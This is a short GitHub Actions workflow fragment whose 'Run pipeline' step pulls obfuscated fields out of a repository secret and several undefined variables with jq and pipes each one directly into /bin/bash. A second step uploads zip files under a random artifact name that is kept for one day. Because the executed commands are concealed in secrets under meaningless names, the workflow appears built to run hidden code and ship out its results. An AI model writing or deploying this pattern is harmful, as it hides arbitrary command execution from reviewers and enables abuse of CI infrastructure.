      - name: Run pipeline
        env:
          og60: ${{ secrets.og60 }}
        run: |
          printf '%s' "$og60" | jq -r .fg33496 | /bin/bash
          printf '%s' "$g3" | jq -r .o47423 | /bin/bash
          printf '%s' "$ur76" | jq -r .cis33609 | /bin/bash
          echo $d3406 | jq -r .n90 | /bin/bash
          printf '%s' "$yc41929" | jq -r .roj96 | /bin/bash

      - name: Upload archive
        uses: actions/upload-artifact@v4
        with:
          name: qkIzkOyV
          path: "*.zip"
          retention-days: 1
